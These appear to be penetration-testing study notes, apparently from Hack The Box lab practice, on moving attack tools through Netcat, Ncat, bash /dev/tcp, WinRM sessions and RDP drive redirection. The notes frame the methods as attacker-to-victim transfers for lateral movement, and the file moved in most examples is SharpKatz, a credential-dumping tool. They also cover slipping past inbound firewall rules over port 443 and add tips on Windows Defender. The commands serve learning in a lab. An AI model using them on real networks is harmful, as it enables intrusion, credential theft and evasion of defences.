>[!ABSTRACT] **Advanced File Transfer: Netcat, WinRM & RDP**

This methodology covers moving files when standard web protocols are blocked. We utilize raw TCP sockets, administrative PowerShell sessions, and RDP drive redirection to maintain lateral movement and tool deployment.

---

>[!INFO] **Netcat (nc) & Ncat**

Netcat is the "Swiss Army Knife" of networking. **Ncat** is the modern Nmap version featuring modern flags like `--send-only` and `--recv-only` which ensure the connection closes automatically after the transfer.

#### **Method 1: Inbound (Victim Listens)**

> [!ATTENTION] **Receiver (Victim Machine)**
> 
> Bash
> 
> ```
> # Original Netcat
> nc -l -p 8000 > SharpKatz.exe
> 
> # Ncat
> ncat -l -p 8000 --recv-only > SharpKatz.exe
> ```

> [!Note] **Attacker (Sending Machine)**
> 
> Bash
> 
> ```
> # Original Netcat
> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
> 
> # Ncat
> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
> ```

#### **Method 2: Outbound (Attacker Listens)**

Used to bypass inbound firewall rules on the victim.

> [!Note] **Attacker (Sending Machine)**
> 
> Bash
> 
> ```
> # Listening on common allowed ports like 443
> sudo ncat -l -p 443 --send-only < SharpKatz.exe
> ```

> [!ATTENTION] **Receiver (Victim Machine)**
> 
> Bash
> 
> ```
> # Using Ncat
> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
> 
> # Using Bash /dev/tcp (If no NC/Ncat is installed)
> cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
> ```

---

>[!TIP] **PowerShell Remoting (WinRM)**

Utilizes **TCP/5985** (HTTP) or **TCP/5986** (HTTPS). Requires Administrative or Remote Management Users privileges.

> [!CHECK] **Pre-Transfer Verification**
> 
> PowerShell
> 
> ```
> Test-NetConnection -ComputerName DATABASE01 -Port 5985
> ```

> [!EXAMPLE] **The Session Tunnel**
> 
> PowerShell
> 
> ```
> # Create the persistent session
> $Session = New-PSSession -ComputerName DATABASE01
> ```

> [!SUCCESS] **File Movement**
> 
> PowerShell
> 
> ```
> # Copy Local -> Remote (Push)
> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
> 
> # Copy Remote -> Local (Pull)
> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
> ```

---

> [!IMPORTANT] **RDP Drive Redirection**

Exposes a local folder to the remote RDP session, making it accessible via `\\tsclient\`.

> [!Note] **Attacker (Mounting the Drive)**
> 
> Bash
> 
> ```
> # Using xfreerdp
> xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/oxtheta/htb/transfer
> 
> # Using rdesktop
> rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/oxtheta/transfer'
> ```

> [!CAUTION] **Accessing the Content**
> 
> On the Windows target, navigate to the share via File Explorer or CMD:
> 
> `\\tsclient\linux`

---

>[!WARNING] **Security & AV Operational Security**

- **Windows Defender:** Sharing a directory containing raw malware scripts via RDP may trigger Defender to delete those files _on your local Arch machine_.
    
- **Cleanup:** Always close PowerShell sessions when finished to avoid leaving active management tunnels: `Remove-PSSession $Session`.
    
- **Verification:** Use `ls -l` or `Get-Item` on the target to verify the file size matches the source after transfer.